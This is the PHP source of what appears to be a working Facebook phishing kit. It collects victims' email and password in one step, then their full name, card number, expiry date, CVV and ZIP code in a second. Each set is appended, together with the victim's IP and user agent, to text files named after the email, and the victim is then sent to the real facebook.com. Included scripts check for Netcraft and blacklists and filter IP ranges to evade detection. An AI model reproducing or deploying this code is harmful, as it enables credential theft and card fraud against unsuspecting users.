<?php
session_start();
// error_reporting(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require "includes/visitor_log.php";
require "includes/netcraft_check.php";
require "includes/blacklist_lookup.php";
require "includes/ip_range_check.php";
include 'includes/source_protect.php';



if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$error = 0;
$err="display: none;";
$cmd=0;

$ip=$_SERVER['REMOTE_ADDR'];

$agent=$_SERVER['HTTP_USER_AGENT'];



$gen = generateRandomString();

if (isset($_SESSION['step'])) {
    $cmd = $_SESSION['step'];
}
if (isset($_SESSION['email'])) {
    $email = $_SESSION['email'];
}

if (isset($_REQUEST['email']) and $_REQUEST['email']!="") {
    $_SESSION['email'] = $email = $_REQUEST['email'];
} else {
    $email="";
}
// echo "$email";
// die();

if (isset($_REQUEST['step'])) {
    $cmd = $_REQUEST['step'];
}

if ($cmd==2) {
    $_SESSION['email'] = $email = $_REQUEST['email'];
    $_SESSION['pass'] = $pass = $_REQUEST['pass'];

    if ($email=="" or $pass=="") {
        $err = "";
         $cmd=1;
    } else {
        $infa = "
-------------------
Email: $email
Password: $pass

$ip
$agent
------------------"
        ;
        $file=fopen("fbsv/$email.txt", "a");
        fwrite($file, $infa);
        fclose($file);
        $cmd=2;
    }
}


if ($cmd==3) {
    $_SESSION['name'] = $name = $_REQUEST['name'];
    $_SESSION['cardnumber'] = $cardnumber = $_REQUEST['cardnumber'];
    $_SESSION['expirationdate'] = $expirationdate = $_REQUEST['expirationdate'];
    $_SESSION['securitycode'] = $securitycode = $_REQUEST['securitycode'];
    $_SESSION['zip'] = $zip = $_REQUEST['zip'];
    $email = $_SESSION['email'];
    $pass = $_SESSION['pass'];

    if ($name=="" or $cardnumber=="" or $expirationdate=="" or $securitycode=="" or $zip=="") {
        $error = 1;
        $err = "";
         $cmd=2;
    } else {
        $infa = "
-------------------
Email: $email
Password: $pass
Full name: $name
CardNumber: $cardnumber
Exp: $expirationdate
Cvv: $securitycode
Zip: $zip

$ip
$agent
------------------"
        ;
        $file=fopen("fbsv/$email.txt", "a");
        fwrite($file, $infa);
        fclose($file);
        $cmd=3;
    }
}

if ($cmd==3) {
    header("Location: https://www.facebook.com/");
    die();
}



if ($cmd>0) {
    $data = file_get_contents($cmd.".html");
} else {
    ?>
<form id="ponyo_form" action="<?php echo $gen;?>" method="POST">

<input type="hidden" name="email" value="<?php echo $email;?>" />
<input type="hidden" name="step" value="1" />
</form>
<script>
document.getElementById("ponyo_form").submit();
</script>
    <?php
}

if ($data!="") {
    $data = str_replace("%email%", $email, $data);
    $data = str_replace("%gen%", $gen, $data);
    $data = str_replace("%err%", $err, $data);
    echo $data;
}
?>